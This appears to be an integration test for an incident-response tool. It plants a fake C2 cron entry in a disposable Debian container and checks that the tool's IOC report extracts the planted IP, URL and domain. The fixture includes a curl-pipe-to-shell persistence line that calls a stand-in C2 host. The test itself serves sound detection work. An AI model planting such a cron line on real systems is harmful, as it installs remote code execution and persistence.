// IOC lead extraction on a real target: a disposable Dropbear container gets a
// cron.d entry with a planted C2 IP/URL and a suspicious domain plus a benign
// distro mirror. The workbench command's stored output feeds
// `emergency-command.iocs`, and the report must surface the planted leads
// while marking the distro host as common.
import { execFileSync } from "node:child_process";
import { randomUUID } from "node:crypto";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { Sidecar, connect } from "./rpc-harness.mjs";

const repository = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../..");
const runId = randomUUID(), name = `lr-iocs-${runId.slice(0, 8)}`;
const evidence = path.join(repository, "target/lab-command-iocs", runId);
fs.mkdirSync(evidence, { recursive: true });
const dataRoot = fs.mkdtempSync(path.join(os.tmpdir(), "lovelyhawk-iocs-"));
const checks = [];
let containerId, sidecar, failure;
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
function check(label, actual) { checks.push({ label, passed: Boolean(actual) }); console.log(`${actual ? "PASS" : "FAIL"} ${label}`); if (!actual) throw new Error(label); }
const podman = (...args) => execFileSync("podman", [...args], { encoding: "utf8", windowsHide: true, timeout: 420_000, maxBuffer: 2 * 1024 * 1024 }).trim();
const wslVm = (...args) => execFileSync("wsl.exe", ["-d", "podman-machine-default", "-u", "root", "--", ...args], { encoding: "utf8", windowsHide: true, timeout: 120_000 }).replace(/\0/gu, "").trim();
function owned() {
  const current = JSON.parse(podman("inspect", containerId))[0];
  if (current.Id !== containerId || ![name, `/${name}`].includes(current.Name) || current.Config.Labels?.["lovelyres-test-run"] !== runId ||
    current.HostConfig.Privileged || (current.Mounts ?? []).length !== 0) throw new Error("Fixture identity changed");
  return current;
}
const onHost = (...args) => { owned(); return podman("exec", containerId, ...args); };
async function until(fn, label, timeout = 60_000) { const end = Date.now() + timeout; while (Date.now() < end) { if (await fn()) return; await sleep(150); } throw new Error(`Timed out: ${label}`); }

try {
  const host = wslVm("ip", "-4", "addr", "show", "eth0").match(/inet (\d+\.\d+\.\d+\.\d+)/u)[1];
  podman("image", "inspect", "docker.io/library/debian:12-slim", "--format", "{{.Id}}");
  const sshPort = 2223;
  containerId = podman("run", "-d", "--name", name, "--label", `lovelyres-test-run=${runId}`, "--memory", "384m", "--cpus", "1", "--network", "host", "docker.io/library/debian:12-slim", "sleep", "3600");
  owned();
  onHost("sh", "-c", "apt-get update -qq >/dev/null 2>&1 && apt-get install -y -qq dropbear-bin openssh-client netcat-openbsd >/dev/null 2>&1");
  onHost("sh", "-c", "echo 'root:LabRoot#2026' | chpasswd; mkdir -p /etc/dropbear; dropbearkey -t ed25519 -f /etc/dropbear/dropbear_ed25519_host_key");
  onHost("sh", "-c", `dropbear -E -p ${sshPort}`);
  await until(() => { try { onHost("nc", "-z", "127.0.0.1", String(sshPort)); return true; } catch { return false; } }, "dropbear listening", 30_000);

  // Planted leads: a C2 IP+URL and an odd domain in cron content, plus a
  // distro mirror that must stay visible but marked common.
  onHost("sh", "-c", "mkdir -p /etc/cron.d && " +
    "printf '* * * * * root curl -fsSL http://1.2.3.4:8080/x.sh | sh\\n' > /etc/cron.d/lhlab-ioc && " +
    "printf '# beacon cdn.badhost-c2.net\\n* * * * * root deb http://deb.debian.org/debian bookworm main\\n' >> /etc/cron.d/lhlab-ioc");

  sidecar = new Sidecar(path.join(repository, "target/debug/lovelyhawk-backend.exe"), dataRoot);
  const connected = await connect(sidecar, { host, port: sshPort, username: "root", password: "LabRoot#2026", id: runId, name });
  if (connected.stage !== "connected") throw new Error(JSON.stringify(connected));
  const binding = connected.bindingHandle;
  check("connects to the fixture", true);

  const catalog = await sidecar.call("emergency-command.catalog.load", { bindingHandle: binding });
  const cron = catalog.commands.find((c) => c.title === "系统计划任务内容");
  check("workbench offers the system crontab collector", Boolean(cron));
  const output = await sidecar.call("emergency-command.run",
    { bindingHandle: binding, snapshotHandle: catalog.snapshotHandle, commandHandle: cron.commandHandle, containerHandle: null });
  check("the run output carries the planted cron lines",
    output.output.includes("http://1.2.3.4:8080/x.sh") && output.output.includes("cdn.badhost-c2.net"));

  const report = await sidecar.call("emergency-command.iocs", { bindingHandle: binding, snapshotHandle: catalog.snapshotHandle });
  fs.writeFileSync(path.join(evidence, "ioc-report.json"), JSON.stringify(report, null, 2));
  const find = (kind, value) => (report.entries ?? []).find((e) => e.kind === kind && e.value === value);
  check("planted IPv4 is a public lead", find("ipv4", "1.2.3.4")?.scope === "public");
  check("planted C2 URL is extracted whole", Boolean(find("url", "http://1.2.3.4:8080/x.sh")));
  check("planted domain is extracted", Boolean(find("domain", "cdn.badhost-c2.net")));
  check("distro mirror stays visible but marked common", find("domain", "deb.debian.org")?.common === true);
  check("every lead names its source command", report.entries.every((e) => Array.isArray(e.sources) && e.sources.length > 0 && e.hits >= 1));
  check("report is bounded and honest about truncation", report.truncated === false);

  console.log(`\n${checks.length}/${checks.length} checks passed`);
} catch (error) {
  failure ??= error?.message ?? String(error);
  console.log(`FAILED: ${failure}`);
  for (const chunk of sidecar?.stderr ?? []) process.stderr.write(chunk);
  process.exitCode = 1;
} finally {
  try { sidecar?.kill(); } catch {}
  try { if (containerId) podman("rm", "-f", containerId); } catch {}
  try { fs.rmSync(dataRoot, { recursive: true, force: true, maxRetries: 10, retryDelay: 300 }); } catch {}
}
